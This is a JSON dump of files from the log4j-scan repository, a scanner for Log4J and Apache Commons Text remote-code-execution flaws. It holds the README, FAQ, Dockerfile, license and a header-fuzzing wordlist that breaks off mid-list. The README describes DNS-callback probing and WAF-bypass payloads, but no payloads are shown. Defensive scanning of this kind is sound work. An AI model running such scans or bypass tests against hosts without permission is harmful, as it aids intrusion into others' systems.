{
  "metadata": {
    "timestamp": 1736560006205,
    "page": 810,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjgyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "fullhunt/log4j-scan",
      "stars": 3406,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.01171875,
          "content": "tests/\nvenv/"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.20703125,
          "content": "FROM python:3-alpine\n\nWORKDIR /app\n\nCOPY requirements.txt requirements.txt\n\nRUN apk add gcc g++ make libffi-dev openssl-dev\nRUN pip3 install -r requirements.txt\n\nCOPY . .\n\nENTRYPOINT [\"python\", \"log4j-scan.py\" ]\n"
        },
        {
          "name": "FAQ.md",
          "type": "blob",
          "size": 1.4482421875,
          "content": "# Frequently Asked Questions\n\n## DNS callback error\n\n```\nTraceback (most recent call last):\nFile \"/Users/user/src/log4j-scan/log4j-scan.py\", line 362, in\nmain()\nFile \"/Users/user/src/log4j-scan/log4j-scan.py\", line 332, in main\ndns_callback = Interactsh()\nFile \"/Users/darkcode/src/log4j-scan/log4j-scan.py\", line 195, in init\nself.register()\nFile \"/Users/user/src/log4j-scan/log4j-scan.py\", line 206, in register\nraise Exception(\"Can not initiate interact.sh DNS callback client\")\nException: Can not initiate interact.sh DNS callback client\n```\n\nIt means that the DNS callback provider is down, it's blocked on your network, or you can not connect to the DNS callback provider due to networking issues. You can use an different DNS Callback provider (eg.. with `--dns-callback-provider dnslog.cn`), or you can use a custom DNS callback host with ` --custom-dns-callback-host`.\n\n---\n\n## Running with Python 2\n\n```\nFile \"log4j-scan.py\", line 136\nfuzzing_headers[\"Referer\"] = f'https://{fuzzing_headers[\"Referer\"]}'\n```\n\nIt should be related to Python 2 compatibility. The tool requires a modern version of Python 3.\n\n---\n\n# Dependencies issue\n\n```\nFile \"/home/parallels/Log4j-RCE-Scanner/log4j-scan/log4j-scan.py\", line 22, in\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nModuleNotFoundError: No module named 'Crypto'\n```\n\nThis should be related to Pycrypto. Please install the latest Python PyCryptodome version. If you're still facing dependencies issues, you can use the Docker image."
        },
        {
          "name": "LICENSE.txt",
          "type": "blob",
          "size": 1.0517578125,
          "content": "The MIT License (MIT)\n\nCopyright (c) 2021 Mazin Ahmed\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 6.7490234375,
          "content": "<h1 align=\"center\">log4j-scan</h1>\n<h4 align=\"center\">A fully automated, accurate, and extensive scanner for finding vulnerable log4j hosts</h4>\n\n![](https://dkh9ehwkisc4.cloudfront.net/static/files/80e52a5b-7d72-44c2-8187-76a2a58f5657-demo.png)\n\n# Features\n\n- Support for lists of URLs.\n- Fuzzing for more than 60 HTTP request headers (not only 3-4 headers as previously seen tools).\n- Fuzzing for HTTP POST Data parameters.\n- Fuzzing for JSON data parameters.\n- Supports DNS callback for vulnerability discovery and validation.\n- WAF Bypass payloads.\n\n---\n\n# ðŸš¨ Annoucement (October 20th, 2022)\n\nFullHunt released an update to identify Apache Commons Text RCE (CVE-2022-42889). Apache Commons Text RCE is highly similar to Log4J RCE, and we recommend patching it as soon as possible. Vulnerable applications allow full remote-code execution. If help is needed in scanning and discovering this vulnerability on your infrastructure, please get in touch at (team@fullhunt.io).\n\n![](https://dkh9ehwkisc4.cloudfront.net/static/files/545a0960-3dc4-4157-bf82-c79d0b73a3e7-CVE-2022-42889-demo.png)\n\n# ðŸš¨ Announcement (December 17th, 2021)\n\nThere is a patch bypass on Log4J v2.15.0 that allows a full RCE. FullHunt added community support for log4j-scan to reliably detect CVE-2021-45046. If you're having difficulty discovering and scanning your infrastructure at scale or keeping up with the Log4J threat, please get in touch at (team@fullhunt.io).\n\n![](https://dkh9ehwkisc4.cloudfront.net/static/files/d385f9d8-e2b1-4d72-b9c2-a62c4c1c34a0-Screenshot-cve-2021-45046-demo.png)\n\n---\n\n# Description\n\nWe have been researching the Log4J RCE (CVE-2021-44228) since it was released, and we worked in preventing this vulnerability with our customers. We are open-sourcing an open detection and scanning tool for discovering and fuzzing for Log4J RCE CVE-2021-44228 vulnerability. This shall be used by security teams to scan their infrastructure for Log4J RCE, and also test for WAF bypasses that can result in achieving code execution on the organization's environment.\n\nIt supports DNS OOB callbacks out of the box, there is no need to set up a DNS callback server.\n\n# Usage\n\n```python\n$ python3 log4j-scan.py -h\npython3 log4j-scan.py -h\n[â€¢] CVE-2021-44228 - Apache Log4j RCE Scanner\n[â€¢] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.\n[â€¢] Secure your External Attack Surface with FullHunt.io.\nusage: log4j-scan.py [-h] [-u URL] [-p PROXY] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing]\n                     [--wait-time WAIT_TIME] [--waf-bypass] [--custom-waf-bypass-payload CUSTOM_WAF_BYPASS_PAYLOAD] [--test-CVE-2021-45046] [--test-CVE-2022-42889]\n                     [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST] [--disable-http-redirects]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -u URL, --url URL     Check a single URL.\n  -p PROXY, --proxy PROXY\n                        send requests through proxy\n  -l USEDLIST, --list USEDLIST\n                        Check a list of URLs.\n  --request-type REQUEST_TYPE\n                        Request Type: (get, post) - [Default: get].\n  --headers-file HEADERS_FILE\n                        Headers fuzzing list - [default: headers.txt].\n  --run-all-tests       Run all available tests on each URL.\n  --exclude-user-agent-fuzzing\n                        Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.\n  --wait-time WAIT_TIME\n                        Wait time after all URLs are processed (in seconds) - [Default: 5].\n  --waf-bypass          Extend scans with WAF bypass payloads.\n  --custom-waf-bypass-payload CUSTOM_WAF_BYPASS_PAYLOAD\n                        Test with custom WAF bypass payload.\n  --test-CVE-2021-45046\n                        Test using payloads for CVE-2021-45046 (detection payloads).\n  --test-CVE-2022-42889\n                        Test using payloads for Apache Commons Text RCE (CVE-2022-42889).\n  --dns-callback-provider DNS_CALLBACK_PROVIDER\n                        DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].\n  --custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST\n                        Custom DNS Callback Host.\n  --disable-http-redirects\n                        Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.\n```\n\n## Scan a Single URL\n\n```shell\n$ python3 log4j-scan.py -u https://log4j.lab.secbot.local\n```\n\n## Scan a Single URL using all Request Methods: GET, POST (url-encoded form), POST (JSON body)\n\n```shell\n$ python3 log4j-scan.py -u https://log4j.lab.secbot.local --run-all-tests\n```\n\n## Discover WAF bypasses against the environment.\n\n```shell\n$ python3 log4j-scan.py -u https://log4j.lab.secbot.local --waf-bypass\n```\n\n## Scan a list of URLs\n\n```shell\n$ python3 log4j-scan.py -l urls.txt\n```\n\n# Installation\n\n```\n$ pip3 install -r requirements.txt\n```\n\n# Docker Support\n\n```shell\ngit clone https://github.com/fullhunt/log4j-scan.git\ncd log4j-scan\nsudo docker build -t log4j-scan .\nsudo docker run -it --rm log4j-scan\n\n# With URL list \"urls.txt\" in current directory\ndocker run -it --rm -v $PWD:/data log4j-scan -l /data/urls.txt\n```\n\n# About FullHunt\n\nFullHunt is the next-generation attack surface management platform. FullHunt enables companies to discover all of their attack surfaces, monitor them for exposure, and continuously scan them for the latest security vulnerabilities. All, in a single platform, and more.\n\nFullHunt provides an enterprise platform for organizations. The FullHunt Enterprise Platform provides extended scanning and capabilities for customers. FullHunt Enterprise platform allows organizations to closely monitor their external attack surface, and get detailed alerts about every single change that happens. Organizations around the world use the FullHunt Enterprise Platform to solve their continuous security and external attack surface security challenges.\n\n# Legal Disclaimer\n\nThis project is made for educational and ethical testing purposes only. Usage of log4j-scan for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.\n\n# License\n\nThe project is licensed under MIT License.\n\n# Author\n\n_Mazin Ahmed_\n\n- Email: _mazin at FullHunt.io_\n- FullHunt: [https://fullhunt.io](https://fullhunt.io)\n- Website: [https://mazinahmed.net](https://mazinahmed.net)\n- Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)\n- Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)\n"
        },
        {
          "name": "headers-large.txt",
          "type": "blob",
          "size": 16.810546875,
          "content": "Accept\nAccept-Application\nAccept-CH\nAccept-Charset\nAccept-CH-Lifetime\nAccept-Datetime\nAccepted\nAccept-Encoding\nAccept-Encodxng\nAccept-Language\nAccept-Patch\nAccept-Ranges\nAccept-Version\nAccess-Control-Allow-Credentials\nAccess-Control-Allow-Headers\nAccess-Control-Allow-Methods\nAccess-Control-Allow-Origin\nAccess-Control-Expose-Headers\nAccess-Control-Max-Age\nAccess-Control-Request-Headers\nAccess-Control-Request-Method\nAccesskey\nAccess-Token\nAction\nAdmin\nAge\nA-IM\nAjax\nAkamai-Origin-Hop\nAllow\nAlt-Svc\nApp\nAppcookie\nApp-Env\nApp-Key\nApply-To-Redirect-Ref\nAppname\nAppversion\nAtcept-Language\nAuth\nAuth-Any\nAuth-Basic\nAuth-Digest\nAuth-Digest-Ie\nAuthentication\nAuth-Gssneg\nAuth-Key\nAuth-Ntlm\nAuthorization\nAuth-Password\nAuth-Realm\nAuth-Type\nAuth-User\nBad-Gateway\nBad-Request\nBae-Env-Addr-Bcms\nBae-Env-Addr-Bcs\nBae-Env-Addr-Bus\nBae-Env-Addr-Channel\nBae-Env-Addr-Sql-Ip\nBae-Env-Addr-Sql-Port\nBae-Env-Ak\nBae-Env-Appid\nBae-Env-Sk\nBae-Logid\nBar\nBase\nBase-Url\nBasic\nBearer-Indication\nBody-Maxlength\nBody-Truncated\nBrief\nBrowser-User-Agent\nCache-Control\nCache-Info\nCase-Files\nCatalog\nCatalog-Server\nCategory\nCert-Cookie\nCert-Flags\nCert-Issuer\nCert-Keysize\nCert-Secretkeysize\nCert-Serialnumber\nCert-Server-Issuer\nCert-Server-Subject\nCert-Subject\nCf-Connecting-Ip\nCf-Ipcountry\nCf-Template-Path\nCf-Visitor\nCh\nChallenge-Response\nCharset\nChunk-Size\nClear-Site-Data\nClient\nClientaddress\nClient-Address\nClient-Bad-Request\nClient-Conflict\nClient-Error-Cannot-Access-Local-File\nClient-Error-Cannot-Connect\nClient-Error-Communication-Failure\nClient-Error-Connect\nClient-Error-Invalid-Parameters\nClient-Error-Invalid-Server-Address\nClient-Error-No-Error\nClient-Error-Protocol-Failure\nClient-Error-Unspecified-Error\nClient-Expectation-Failed\nClient-Forbidden\nClient-Gone\nClientip\nClient-Ip\nClient-IP\nClient-Length-Required\nClient-Method-Not-Allowed\nClient-Not-Acceptable\nClient-Not-Found\nClient-Payment-Required\nClient-Precondition-Failed\nClient-Proxy-Auth-Required\nClient-Quirk-Mode\nClient-Requested-Range-Not-Possible\nClient-Request-Timeout\nClient-Request-Too-Large\nClient-Request-Uri-Too-Large\nClient-Unauthorized\nClient-Unsupported-Media-Type\nCloudfront-Viewer-Country\nCloudinary-Name\nCloudinary-Public-Id\nCloudinaryurl\nCloudinary-Version\nCluster-Client-IP\nCode\nComing-From\nCompress\nConflict\nConnection\nConnection-Type\nContact\nContent\nContent-Disposition\nContent-Encoding\nContent-Language\nContent-Length\nContent-Location\nContent-Md5\nContent-MD5\nContent-Range\nContent-Security-Policy\nContent-Security-Policy-Report-Only\nContent-Type\nContent-Type-Xhtml\nContext-Path\nContinue\nCookie\nCookie2\nCookie-Domain\nCookie-Httponly\nCookie-Parse-Raw\nCookie-Path\nCookies\nCookie-Secure\nCookie-Vars\nCore-Base\nCorrelates\nCreated\nCredentials-Filepath\nCross-Origin-Resource-Policy\nCurl\nCurl-Multithreaded\nCustom-Header\nCustom-Secret-Header\nDataserviceversion\nDate\nDebug\nDeflate-Level-Def\nDeflate-Level-Max\nDeflate-Level-Min\nDeflate-Strategy-Def\nDeflate-Strategy-Filt\nDeflate-Strategy-Fixed\nDeflate-Strategy-Huff\nDeflate-Strategy-Rle\nDeflate-Type-Gzip\nDeflate-Type-Raw\nDeflate-Type-Zlib\nDelete\nDelta-Base\nDepth\nDestination\nDestroy\nDevblocksproxybase\nDevblocksproxyhost\nDevblocksproxyssl\nDevice-Memory\nDevice-Stock-Ua\nDigest\nDir\nDir-Name\nDir-Resource\nDisable-Gzip\nDkim-Signature\nDnt\nDNT\nDownload-Attachment\nDownload-Bad-Url\nDownload-Bz2\nDownload-Cut-Short\nDownload-E-Headers-Sent\nDownload-E-Invalid-Archive-Type\nDownload-E-Invalid-Content-Type\nDownload-E-Invalid-File\nDownload-E-Invalid-Param\nDownload-E-Invalid-Request\nDownload-E-Invalid-Resource\nDownload-E-No-Ext-Mmagic\nDownload-E-No-Ext-Zlib\nDownload-Inline\nDownload-Mime-Type\nDownload-No-Server\nDownload-Size\nDownload-Status-Not-Found\nDownload-Status-Server-Error\nDownload-Status-Unauthorized\nDownload-Status-Unknown\nDownload-Tar\nDownload-Tgz\nDownload-Url\nDownload-Zip\nDPR\nEarly-Data\nE-Encoding\nE-Header\nE-Invalid-Param\nE-Malformed-Headers\nE-Message-Type\nEnable-Gzip\nEnable-No-Cache-Headers\nEncoding-Stream-Flush-Full\nEncoding-Stream-Flush-None\nEncoding-Stream-Flush-Sync\nEnv-Silla-Environment\nEnv-Vars\nE-Querystring\nE-Request\nE-Request-Method\nE-Request-Pool\nE-Response\nError\nError-1\nError-2\nError-3\nError-4\nError-Formatting-Html\nE-Runtime\nE-Socket\nEspo-Authorization\nEspo-Cgi-Auth\nEtag\nETag\nE-Url\nEve-Charid\nEve-Charname\nEve-Solarsystemid\nEve-Solarsystemname\nEve-Trusted\nEx-Copy-Movie\nExpect\nExpectation-Failed\nExpect-CT\nExpires\nExt\nFailed-Dependency\nFake-Header\nFastly-Client-Ip\nFb-Appid\nFb-Secret\nFeature-Policy\nFilename\nFile-Not-Found\nFiles\nFiles-Vars\nFire-Breathing-Dragon\nFoo\nFoo-Bar\nForbidden\nForce-Language\nForce-Local-Xhprof\nFormat\nForwarded\nForwarded-For\nForwarded-For-Ip\nForwarded-Proto\nFrom\nFromlink\nFront-End-Https\nGateway-Interface\nGateway-Time-Out\nGet\nGet-Vars\nGivenname\nGlobal-All\nGlobal-Cookie\nGlobal-Get\nGlobal-Post\nGone\nGoogle-Code-Project-Hosting-Hook-Hmac\nGzip-Level\nH0st\nHead\nHeader\nHeader-Lf\nHeader-Status-Client-Error\nHeader-Status-Informational\nHeader-Status-Redirect\nHeader-Status-Server-Error\nHeader-Status-Successful\nHome\nHost\nHosti\nHost-Liveserver\nHost-Name\nHost-Unavailable\nHtaccess\nHTTP2-Settings\nHttp-Accept\nHttp-Accept-Encoding\nHttp-Accept-Language\nHttp-Authorization\nHttp-Connection\nHttp-Cookie\nHttp-Host\nHttp-Phone-Number\nHttp-Referer\nHttps\nHttps-From-Lb\nHttps-Keysize\nHttps-Secretkeysize\nHttps-Server-Issuer\nHttps-Server-Subject\nHttp-Url\nHttp-User-Agent\nIf\nIf-Match\nIf-Modified-Since\nIf-Modified-Since-Version\nIf-None-Match\nIf-Posted-Before\nIf-Range\nIf-Unmodified-Since\nIf-Unmodified-Since-Version\nIM\nImage\nImages\nIncap-Client-Ip\nInfo\nInfo-Download-Size\nInfo-Download-Time\nInfo-Return-Code\nInfo-Total-Request-Stat\nInfo-Total-Response-Stat\nInsufficient-Storage\nInternal-Server-Error\nIpresolve-Any\nIpresolve-V4\nIpresolve-V6\nIschedule-Version\nIv-Groups\nIv-User\nJavascript\nJenkins\nKeep-Alive\nKiss-Rpc\nLabel\nLarge-Allocation\nLast-Event-Id\nLast-Modified\nLength-Required\nLink\nLocal-Addr\nLocal-Content-Sha1\nLocal-Dir\nLocation\nLocked\nLock-Token\nMail\nMandatory\nMax-Conn\nMaxdataserviceversion\nMax-Forwards\nMax-Request-Size\nMax-Uri-Length\nMessage\nMessage-B\nMeth-\nMeth-Acl\nMeth-Baseline-Control\nMeth-Checkin\nMeth-Checkout\nMeth-Connect\nMeth-Copy\nMeth-Delete\nMeth-Get\nMeth-Head\nMeth-Label\nMeth-Lock\nMeth-Merge\nMeth-Mkactivity\nMeth-Mkcol\nMeth-Mkworkspace\nMeth-Move\nMethod\nMethod-Not-Allowed\nMeth-Options\nMeth-Post\nMeth-Propfind\nMeth-Proppatch\nMeth-Put\nMeth-Report\nMeth-Trace\nMeth-Uncheckout\nMeth-Unlock\nMeth-Update\nMeth-Version-Control\nMimetype\nModauth\nMode\nMod-Env\nMod-Rewrite\nMod-Security-Message\nModule-Class\nModule-Class-Path\nModule-Name\nMoved-Permanently\nMoved-Temporarily\nMs-Asprotocolversion\nMsg-None\nMsg-Request\nMsg-Response\nMsisdn\nMultipart-Boundary\nMultiple-Choices\nMulti-Status\nMust\nMy-Header\nMysqlport\nNative-Sockets\nNegotiate\nNl\nNo-Content\nNon-Authoritative\nNonce\nNot-Acceptable\nNot-Exists\nNot-Extended\nNot-Found\nNotification-Template\nNot-Implemented\nNot-Modified\nOc-Chunked\nOcs-Apirequest\nOk\nOn-Behalf-Of\nOnerror-Continue\nOnerror-Die\nOnerror-Return\nOnly\nOpencart\nOptions\nOrganizer\nOrigin\nOriginator\nOrig_path_info\nOverwrite\nP3P\nParams-Allow-Comma\nParams-Allow-Failure\nParams-Default\nParams-Get-Catid\nParams-Get-Currentday\nParams-Get-Disposition\nParams-Get-Downwards\nParams-Get-Givendate\nParams-Get-Lang\nParams-Get-Type\nParams-Raise-Error\nPartial-Content\nPasskey\nPassword\nPath\nPath-Base\nPath-Info\nPath-Themes\nPath-Translated\nPayment-Required\nPc-Remote-Addr\nPermanent\nPhone-Number\nPhp\nPhp-Auth-Pw\nPhp-Auth-User\nPhpthreads\nPink-Pony\nPort\nPortsensor-Auth\nPost\nPost-Error\nPost-Files\nPostredir-301\nPostredir-302\nPostredir-All\nPost-Vars\nPragma\nPragma-No-Cache\nPrecondition-Failed\nPrefer\nProcessing\nProfile\nProtocol\nProtocols\nProxy\nProxy-Agent\nProxy-Authenticate\nProxy-Authentication-Required\nProxy-Authorization\nProxy-Connection\nProxy-Host\nProxy-Http\nProxy-Http-1-0\nProxy-Password\nProxy-Port\nProxy-Pwd\nProxy-Request-Fulluri\nProxy-Socks4\nProxy-Socks4a\nProxy-Socks5\nProxy-Socks5-Hostname\nProxy-Url\nProxy-User\nPublic-Key-Pins\nPublic-Key-Pins-Report-Only\nPull\nPut\nQuerystring\nQuery-String\nQuerystring-Type-Array\nQuerystring-Type-Bool\nQuerystring-Type-Float\nQuerystring-Type-Int\nQuerystring-Type-Object\nQuerystring-Type-String\nRange\nRange-Not-Satisfiable\nRaw-Post-Data\nRead-State-Begin\nRead-State-Body\nRead-State-Headers\nReal-Ip\nReal-Method\nReason\nReason-Phrase\nRecipient\nRedirect\nRedirected-Accept-Language\nRedirect-Found\nRedirection-Found\nRedirection-Multiple-Choices\nRedirection-Not-Modified\nRedirection-Permanent\nRedirection-See-Other\nRedirection-Temporary\nRedirection-Unused\nRedirection-Use-Proxy\nRedirect-Perm\nRedirect-Post\nRedirect-Problem-Withoutwww\nRedirect-Problem-Withwww\nRedirect-Proxy\nRedirect-Temp\nRef\nReferer\nReferrer\nReferrer-Policy\nRefferer\nRefresh\nRemix-Hash\nRemote-Addr\nRemote-Host\nRemote-Host-Wp\nRemote-User\nRemote-Userhttps\nReport-To\nRequest\nRequest2-Tests-Base-Url\nRequest2-Tests-Proxy-Host\nRequest-Entity-Too-Large\nRequest-Error\nRequest-Error-File\nRequest-Error-Gzip-Crc\nRequest-Error-Gzip-Data\nRequest-Error-Gzip-Method\nRequest-Error-Gzip-Read\nRequest-Error-Proxy\nRequest-Error-Redirects\nRequest-Error-Response\nRequest-Error-Url\nRequest-Http-Ver-1-0\nRequest-Http-Ver-1-1\nRequest-Mbstring\nRequest-Method\nRequest-Method-\nRequest-Method-Delete\nRequest-Method-Get\nRequest-Method-Head\nRequest-Method-Options\nRequest-Method-Post\nRequest-Method-Put\nRequest-Method-Trace\nRequest-Timeout\nRequest-Time-Out\nRequesttoken\nRequest-Uri\nRequest-Uri-Too-Large\nRequest-Vars\nReset-Content\nResponse\nRest-Key\nRest-Sign\nRetry-After\nReturned-Error\nRlnclientipaddr\nRoot\nSafe-Ports-List\nSafe-Ports-Ssl-List\nSave-Data\nSchedule-Reply\nScheme\nScript-Name\nSec-Fetch-Dest\nSec-Fetch-Mode\nSec-Fetch-Site\nSec-Fetch-User\nSecretkey\nSec-Websocket-Accept\nSec-WebSocket-Accept\nSec-Websocket-Extensions\nSec-Websocket-Key\nSec-Websocket-Key1\nSec-Websocket-Key2\nSec-Websocket-Origin\nSec-Websocket-Protocol\nSec-Websocket-Version\nSee-Other\nSelf\nSend-X-Frame-Options\nServer\nServer-Bad-Gateway\nServer-Error\nServer-Gateway-Timeout\nServer-Internal\nServer-Name\nServer-Not-Implemented\nServer-Port\nServer-Port-Secure\nServer-Protocol\nServer-Service-Unavailable\nServer-Software\nServer-Timing\nServer-Unsupported-Version\nServer-Vars\nServer-Varsabantecart\nService-Unavailable\nSession-Id-Tag\nSession-Vars\nSet-Cookie\nSet-Cookie2\nShib-\nShib-Application-Id\nShib-Identity-Provider\nShib-Logouturl\nShopilex\nSlug\nSn\nSoapaction\nSocket-Connection-Err\nSocketlog\nSomevar\nSourcemap\nSourceMap\nSp-Client\nSp-Host\nSsl\nSsl-Https\nSsl-Offloaded\nSslsessionid\nSsl-Session-Id\nSsl-Version-Any\nStart\nStatus\nStatus-\nStatus-403\nStatus-403-Admin-Del\nStatus-404\nStatus-Bad-Request\nStatus-Code\nStatus-Forbidden\nStatus-Ok\nStatus-Platform-403\nStrict-Transport-Security\nStr-Match\nSuccess-Accepted\nSuccess-Created\nSuccess-No-Content\nSuccess-Non-Authoritative\nSuccess-Ok\nSuccess-Partial-Content\nSuccess-Reset-Content\nSupport\nSupport-Encodings\nSupport-Events\nSupport-Magicmime\nSupport-Requests\nSupport-Sslrequests\nSurrogate-Capability\nSwitching-Protocols\nTe\nTE\nTemporary-Redirect\nTest\nTest-Config\nTest-Server-Path\nTest-Something-Anything\nTicket\nTimeout\nTime-Out\nTiming-Allow-Origin\nTitle\nTk\nTmp\nToken\nTrailer\nTransfer-Encoding\nTranslate\nTransport-Err\nTrue-Client-Ip\nTrue-Client-IP\nUa\nUa-Color\nUa-Cpu\nUa-Os\nUa-Pixels\nUa-Resolution\nUa-Voice\nUnauthorized\nUnencoded-Url\nUnit-Test-Mode\nUnless-Modified-Since\nUnprocessable-Entity\nUnsupported-Media-Type\nUpgrade\nUpgrade-Insecure-Requests\nUpgrade-Required\nUpload-Default-Chmod\nUri\nUrl\nUrl-From-Env\nUrl-Join-Path\nUrl-Join-Query\nUrl-Replace\nUrl-Sanitize-Path\nUrl-Strip-\nUrl-Strip-All\nUrl-Strip-Auth\nUrl-Strip-Fragment\nUrl-Strip-Pass\nUrl-Strip-Path\nUrl-Strip-Port\nUrl-Strip-Query\nUrl-Strip-User\nUse-Gzip\nUse-Proxy\nUser\nUseragent\nUser-Agent\nUseragent-Via\nUser-Agent-Via\nUser-Email\nUser-Id\nUser-Mail\nUser-Name\nUser-Photos\nUtil\nVariant-Also-Varies\nVary\nVerbose\nVerbose-Throttle\nVerify-Cert\nVersion\nVersion-1-0\nVersion-1-1\nVersion-Any\nVersioncode\nVersion-None\nVersion-Not-Supported\nVia\nViad\nWaf-Stuff-Below\nWant-Digest\nWap-Connection\nWarning\nWebodf-Member-Id\nWebodf-Session-Id\nWebodf-Session-Revision\nWeb-Server-Api\nWork-Directory\nWww-Address\nWww-Authenticate\nWWW-Authenticate\nX\nX-\nX-Aastra-Expmod1\nX-Aastra-Expmod2\nX-Aastra-Expmod3\nX-Accel-Mapping\nX-Access-Token\nX-Advertiser-Id\nX-Ajax-Real-Method\nX_alto_ajax_key\nX-Alto-Ajax-Keyz\nX-Amz-Date\nX-Amzn-Remapped-Host\nX-Amz-Website-Redirect-Location\nX-Api-Key\nX-Api-Signature\nX-Api-Timestamp\nX-Apitoken\nX-Api-Version\nX-Apple-Client-Application\nX-Apple-Store-Front\nX-Arr-Log-Id\nX-Arr-Ssl\nX-Att-Deviceid\nX-ATT-DeviceId\nX-Authentication\nX-Authentication-Key\nX-Auth-Key\nX-Auth-Mode\nXauthorization\nX-Authorization\nX-Auth-Password\nX-Auth-Service-Provider\nX-Auth-Token\nX-Auth-User\nX-Auth-Userid\nX-Auth-Username\nX-Avantgo-Screensize\nX-Azc-Remote-Addr\nX-Bear-Ajax-Request\nX-Bluecoat-Via\nX-Bolt-Phone-Ua\nX-Browser-Height\nX-Browser-Width\nX-Cascade\nX-Cept-Encoding\nX-Cf-Url\nX-Chrome-Extension\nX-Cisco-Bbsm-Clientip\nX-Client-Host\nX-Client-Id\nX-Clientip\nX-Client-Ip\nX-Client-IP\nX-Client-Key\nX-Client-Os\nX-Client-Os-Ver\nX-Cluster-Client-Ip\nX-Codeception-Codecoverage\nX-Codeception-Codecoverage-Config\nX-Codeception-Codecoverage-Debug\nX-Codeception-Codecoverage-Suite\nX-Collect-Coverage\nX-Coming-From\nX-Confirm-Delete\nX-Content-Type\nX-Content-Type-Options\nX-Correlation-ID\nX-Credentials-Request\nX-Csrf-Crumb\nX-Csrftoken\nX-Csrf-Token\nX-CSRFToken\nX-Cuid\nX-Custom\nX-Dagd-Proxy\nX-Davical-Testcase\nX-Dcmguid\nX-Debug-Test\nX-Device-User-Agent\nX-Dialog\nX-Dns-Prefetch-Control\nX-DNS-Prefetch-Control\nX-Dokuwiki-Do\nX-Do-Not-Track\nX-Drestcg\nX-Dsid\nX-Elgg-Apikey\nX-Elgg-Hmac\nX-Elgg-Hmac-Algo\nX-Elgg-Nonce\nX-Elgg-Posthash\nX-Elgg-Posthash-Algo\nX-Elgg-Time\nX-Em-Uid\nX-Enable-Coverage\nX-Environment-Override\nX-Expected-Entity-Length\nX-Experience-Api-Version\nX-Fb-User-Remote-Addr\nX-File-Id\nX-Filename\nX-File-Name\nX-File-Resume\nX-File-Size\nX-File-Type\nX-Firelogger\nX-Fireloggerauth\nX-Firephp-Version\nX-Flash-Version\nX-Flx-Consumer-Key\nX-Flx-Consumer-Secret\nX-Flx-Redirect-Url\nX-Foo\nX-Foo-Bar\nX-Forwarded\nX-Forwarded-By\nX-Forwarded-For\nX-Forwarded-For-Original\nX-Forwarded-Host\nX-Forwarded-Port\nX-Forwarded-Proto\nX-Forwarded-Protocol\nX-Forwarded-Scheme\nX-Forwarded-Server\nX-Forwarded-Ssl\nX-Forwarder-For\nX-Forward-For\nX-Forward-Proto\nX-Frame-Options\nX-From\nX-Gb-Shared-Secret\nX-Geoip-Country\nX-Get-Checksum\nX-Helpscout-Event\nX-Helpscout-Signature\nX-Hgarg-\nX-Host\nX-Http-Destinationurl\nX-Http-Host-Override\nX-Http-Method\nX-Http-Method-Override\nX-HTTP-Method-Override\nX-Http-Path-Override\nX-Https\nX-Htx-Agent\nX-Huawei-Userid\nX-Hub-Signature\nX-If-Unmodified-Since\nX-Imbo-Test-Config\nX-Insight\nX-Ip\nX-Ip-Trail\nX-Iwproxy-Nesting\nX-Jphone-Color\nX-Jphone-Display\nX-Jphone-Geocode\nX-Jphone-Msname\nX-Jphone-Uid\nX-Json\nX-Kaltura-Remote-Addr\nX-Known-Signature\nX-Known-Username\nX-Litmus\nX-Litmus-Second\nX-Locking\nX-Machine\nX-Mandrill-Signature\nX-Method-Override\nX-Mobile-Gateway\nX-Mobile-Ua\nX-Mosso-Dt\nX-Moz\nX-Msisdn\nX-Ms-Policykey\nX-Myqee-System-Debug\nX-Myqee-System-Hash\nX-Myqee-System-Isadmin\nX-Myqee-System-Isrest\nX-Myqee-System-Pathinfo\nX-Myqee-System-Project\nX-Myqee-System-Rstr\nX-Myqee-System-Time\nX-Network-Info\nX-Nfsn-Https\nX-Ning-Request-Uri\nX-Nokia-Bearer\nX-Nokia-Connection-Mode\nX-Nokia-Gateway-Id\nX-Nokia-Ipaddress\nX-Nokia-Msisdn\nX-Nokia-Wia-Accept-Original\nX-Nokia-Wtls\nX-Nuget-Apikey\nX-Oc-Mtime\nXonnection\nX-Opera-Info\nX-Operamini-Features\nX-Operamini-Phone\nX-Operamini-Phone-Ua\nX-Options\nX-Orange-Id\nX-Orchestra-Scheme\nX-Orig-Client\nX-Original-Host\nX-Original-Ht